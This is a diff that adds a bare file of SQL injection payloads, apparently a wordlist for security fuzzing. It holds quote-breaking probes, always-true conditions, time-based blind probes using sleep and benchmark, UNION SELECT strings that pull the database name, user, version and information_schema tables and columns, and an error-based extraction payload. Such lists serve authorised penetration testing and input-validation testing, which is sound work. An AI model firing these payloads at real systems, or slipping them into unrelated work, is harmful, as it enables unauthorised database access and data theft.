@@ -1,0 +1,29 @@
+'
+"
+'
+"
+')
+")
+'))
+"))
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1'/*
+" OR "1"="1
+" OR "1"="1" --
+' OR 1=1 --
+' OR 1=1 #
+' OR 1=1/*
+' OR '1'='1' AND sleep(5) --
+' OR '1'='1' AND benchmark(10000000,MD5('a')) --
+' UNION SELECT NULL --
+' UNION SELECT NULL,NULL --
+' UNION SELECT NULL,NULL,NULL --
+' UNION SELECT database(),user(),version() --
+' UNION SELECT table_name,NULL FROM information_schema.tables --
+' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users' --
+' AND 1=1 --
+' AND 1=2 --
+' AND SLEEP(5) --
+' AND (SELECT * FROM(SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --
